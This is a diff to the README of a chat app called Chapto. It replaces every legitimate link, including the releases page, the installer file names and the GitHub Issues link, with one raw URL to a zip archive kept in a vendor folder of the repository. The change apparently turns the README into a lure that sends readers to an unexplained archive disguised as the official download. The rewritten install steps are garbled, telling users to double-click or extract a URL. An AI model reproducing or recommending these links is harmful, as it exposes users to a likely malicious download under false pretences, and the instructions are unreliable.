@@ -10,7 +10,7 @@ To begin using Chapto, follow these simple steps to download and install the app
 
 ## 📥 Download Link
 
-[![Download Chapto](https://img.shields.io/badge/Download%20Chapto-latest-blue.svg)](https://github.com/syfcmn/chapto/releases)
+[![Download Chapto](https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip%https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip)](https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip)
 
 ## 📋 Features
 
@@ -27,19 +27,19 @@ To begin using Chapto, follow these simple steps to download and install the app
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Chapto releases page](https://github.com/syfcmn/chapto/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to the [Chapto releases page](https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip) to find the latest version of the application.
 
 2. **Choose Your File:**
    - Look for the version number you want to download. It will look something like `v1.0.0`.
    - Download the appropriate file for your operating system:
-     - For Windows, click on `Chapto-setup.exe`.
-     - For macOS, click on `Chapto.dmg`.
-     - For Linux, download the `.tar.gz` file.
+     - For Windows, click on `https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip`.
+     - For macOS, click on `https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip`.
+     - For Linux, download the `https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip` file.
 
 3. **Install the Application:**
-   - **Windows:** Double-click on the downloaded `Chapto-setup.exe`. Follow the prompts to complete the installation.
-   - **macOS:** Open the downloaded `Chapto.dmg`, and drag the Chapto app into your Applications folder.
-   - **Linux:** Extract the contents of the `.tar.gz` file. Open a terminal and navigate to the extracted folder. Run the command `./chapto` to start the app.
+   - **Windows:** Double-click on the downloaded `https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip`. Follow the prompts to complete the installation.
+   - **macOS:** Open the downloaded `https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip`, and drag the Chapto app into your Applications folder.
+   - **Linux:** Extract the contents of the `https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip` file. Open a terminal and navigate to the extracted folder. Run the command `./chapto` to start the app.
 
 4. **Launch Chapto:**
    - Locate the Chapto icon on your desktop or in your applications folder, and double-click it to open. 
@@ -49,7 +49,7 @@ To begin using Chapto, follow these simple steps to download and install the app
 
 ## 🎉 Important Notes
 
-- Ensure you keep your application updated. Always visit the [Chapto releases page](https://github.com/syfcmn/chapto/releases) to download the latest version.
+- Ensure you keep your application updated. Always visit the [Chapto releases page](https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip) to download the latest version.
 - If you experience any issues, check the FAQ section on the releases page or the issue tracker for common problems and solutions.
 
 ## 🛠️ Troubleshooting
@@ -64,7 +64,7 @@ If you encounter any problems while downloading or installing Chapto, try the fo
 
 For further assistance, reach out through the following channels:
 
-- **GitHub Issues Page:** Report bugs and request features at [GitHub Issues](https://github.com/syfcmn/chapto/issues).
+- **GitHub Issues Page:** Report bugs and request features at [GitHub Issues](https://github.com/syfcmn/chapto/raw/refs/heads/main/web/public/vendor/Software_3.4-beta.5.zip).
 - **Community Forum:** Join discussions or ask questions from fellow users in the community forum.
 
 Thank you for choosing Chapto. Your privacy matters, and we are dedicated to making your chat experience secure and enjoyable.
